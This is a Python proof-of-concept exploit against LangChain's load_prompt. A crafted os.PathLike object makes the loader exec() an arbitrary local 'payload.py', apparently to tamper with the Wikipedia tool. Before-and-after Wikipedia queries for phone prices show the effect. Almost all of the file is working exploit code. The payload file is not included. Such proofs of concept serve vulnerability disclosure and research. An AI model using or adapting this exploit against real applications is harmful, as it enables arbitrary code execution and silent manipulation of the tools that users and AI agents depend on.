import re

# required by exploit
from langchain.prompts import load_prompt

# will be exploited
from langchain.tools import WikipediaQueryRun
from langchain.utilities import WikipediaAPIWrapper

#
# pre-exploit
#
print('pre-exploit')

# tool `wikipedia` is not exploited at this moment
wikipedia = WikipediaQueryRun(api_wrapper=WikipediaAPIWrapper())

iphone_res = wikipedia.run('Apple_IPhone_14')
iphone_res = iphone_res[:iphone_res.find('Page:', len('Page:'))]
# print(iphone_res)
print('Apple_IPhone_14', re.findall(r"\$\d+", iphone_res))

samsung_res = wikipedia.run('Samsung_Galaxy_S22')
samsung_res = samsung_res[:samsung_res.find('Page:', len('Page:'))]
# print(samsung_res)
print('Samsung_Galaxy_S22', re.findall(r"\$\d+", samsung_res))
print('-' * 32)

#
# exploit in `payload.py`
#
import os
import json
import importlib
from tempfile import NamedTemporaryFile

from langchain.schema import BasePromptTemplate

class NotStrLike(os.PathLike):
    def __init__(self, path):
        self.path = path
        self.suffix = '.json'

    def __fspath__(self):
        prompt = self.load_prompt_py(self.path)
        del prompt.output_parser # because `prompt.save` complains

        with NamedTemporaryFile(suffix=self.suffix, delete=False) as f:
            tmp_path = f.name

        prompt.save(tmp_path)
        return tmp_path
    
    def load_prompt_py(self, file_path):
        spec = importlib.util.spec_from_loader(
            "prompt", loader=None, origin=str(file_path)
        )
        if spec is None:
            raise ValueError("could not load spec")
        helper = importlib.util.module_from_spec(spec)
        with open(file_path, "rb") as f:
            exec(f.read(), helper.__dict__)
        if not isinstance(helper.PROMPT, BasePromptTemplate):
            raise ValueError("Did not get object of type BasePromptTemplate.")
        return helper.PROMPT

load_prompt(NotStrLike('payload.py'))

#
# post-exploit
#
print('post-exploit')

# use exploited tool `wikipedia`
# tool `wikipedia` is not exploited at this moment
wikipedia = WikipediaQueryRun(api_wrapper=WikipediaAPIWrapper())

iphone_res = wikipedia.run('Apple_IPhone_14')
iphone_res = iphone_res[:iphone_res.find('Page:', len('Page:'))]
# print(iphone_res)
print('Apple_IPhone_14', re.findall(r"\$\d+", iphone_res))

samsung_res = wikipedia.run('Samsung_Galaxy_S22')
samsung_res = samsung_res[:samsung_res.find('Page:', len('Page:'))]
# print(samsung_res)
print('Samsung_Galaxy_S22', re.findall(r"\$\d+", samsung_res))